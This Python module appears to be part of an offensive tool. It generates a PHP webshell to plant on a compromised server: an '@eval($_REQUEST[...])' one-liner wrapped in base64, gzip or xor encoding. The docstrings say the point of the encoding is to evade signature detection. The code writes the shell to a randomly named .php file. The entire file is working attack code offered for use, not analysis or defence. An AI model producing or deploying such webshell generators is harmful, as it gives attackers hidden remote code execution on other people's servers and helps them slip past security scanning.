"""Generate an initial (optionally obfuscated) PHP webshell to plant.

Every other feature assumes you *already* have a shell; this closes the loop by
producing the first one. The shell is a one-liner ``@eval($_REQUEST[pw])`` whose
body is wrapped through the same encoder layer used on the wire (:mod:`encoders`
+ the PHP backend), so the dropped file carries no plain ``eval(base64_decode(``
signature when an evasive encoder is chosen.
"""

from __future__ import annotations

from pathlib import Path

from ..core.backends.php import PHPBackend
from ..encoders import get_transform
from ..utils.strings import random_string


def generate_webshell(password: str, *, encoder: str = "base64") -> str:
    """Return PHP source for a webshell read via ``$_REQUEST[password]``.

    Following the project convention, the password *is* the request parameter
    name. With ``encoder="base64"`` (default) the canonical eval body is wrapped
    via base64; ``b64var``/``gzip``/``xor`` produce harder-to-signature variants.
    """
    inner = f"@eval($_REQUEST['{password}']);"
    backend = PHPBackend()
    transform = get_transform(encoder)
    if transform.name not in backend.supported_transforms:
        raise ValueError(f"encoder {encoder!r} is not usable for PHP shell generation")
    return f"<?php {backend.wrap_eval(transform.apply(inner.encode()))}"


def write_webshell(
    output_dir: Path, password: str, *, encoder: str = "base64", filename: str | None = None
) -> Path:
    """Write a generated webshell into ``output_dir`` and return its path."""
    source = generate_webshell(password, encoder=encoder)
    out = output_dir / (filename or f"shell_{random_string(8)}.php")
    out.write_text(source)
    return out
